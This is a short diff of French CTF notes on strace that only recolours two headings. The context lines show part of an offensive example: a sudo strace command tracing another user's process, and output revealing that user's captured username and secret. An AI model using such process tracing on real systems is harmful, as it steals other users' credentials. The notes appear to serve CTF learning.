@@ -59,7 +59,7 @@ strace -f -p <PID>
 
 ### <mark style="color:red;">📂 Exemple offensif en CTF (ton script)</mark>
 
-#### Script
+#### <mark style="color:green;">Script</mark>
 
 ```bash
 #!/bin/bash
@@ -78,7 +78,7 @@ done
 sudo -u rebecca_smith /usr/bin/strace -s 128 -p $TARGET_PID -f -e trace=openat,read
 ```
 
-#### Résultat
+#### <mark style="color:green;">Résultat</mark>
 
 ```
 [pid 78333] read(7, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 512) = 54
